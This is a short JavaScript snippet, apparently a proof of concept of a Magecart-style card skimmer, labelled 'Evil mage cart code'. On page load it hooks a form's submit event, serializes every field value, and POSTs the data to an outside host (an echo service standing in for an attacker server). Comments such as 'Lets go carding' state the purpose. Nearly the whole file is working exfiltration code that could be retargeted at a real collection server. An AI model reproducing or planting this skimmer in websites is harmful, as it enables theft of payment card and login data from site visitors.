// injection technique borrowed from http://stackoverflow.com/questions/840240/injecting-jquery-into-a-page-fails-when-using-google-ajax-libraries-api
window.onload = function() {

// Evil mage cart code
$("#some.Form").on('submit', function(e) {
  //e.preventDefault();
  var data = $("#some.Form").serializeArray();
  var evilPayDirt = "{";
  data.map(function(a){  evilPayDirt = evilPayDirt + a.name+":"+a.value+"," });
  evilPayDirt = evilPayDirt + "}";
  epd = JSON.stringify(evilPayDirt);
  alert(epd);
  setTimeout(function() {
    jQuery.ajax({
      type: "POST",
      async: !0,
      url: "https://postman-echo.com/post", // check fiddler / wireshark for 200
      data: epd,
      dataType: "application/json",
      error: function(errdata) { alert('Data Exfiltration Error occured... Grrr...'+errdata); },
      success: function(retdata) {  return retdata; alert('Lets go carding... with: '+retdata);  }      
    });
  }, 500)
});

$("#some.intersting.button").click(function(){
  //alert("button clicked");
});

// compatibility for jquery and vue.js, as may conflict with electron/nodejs so include here to regain functionality 
  var script = document.createElement("script");
  script.src = "https://code.jquery.com/jquery-2.1.4.min.js";
  document.body.appendChild(script);
};